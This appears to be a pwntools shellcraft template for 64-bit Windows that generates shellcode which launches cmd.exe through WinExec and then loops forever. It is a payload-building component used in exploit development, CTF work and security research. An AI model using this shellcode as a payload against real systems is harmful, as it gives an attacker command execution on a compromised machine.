<%
    from pwnlib.shellcraft import amd64
%>
<%docstring>Execute cmd.exe and keep the parent process
in an infinite loop.
</%docstring>

    ${amd64.windows.winexec(b'cmd.exe')}
    ${amd64.infloop()}
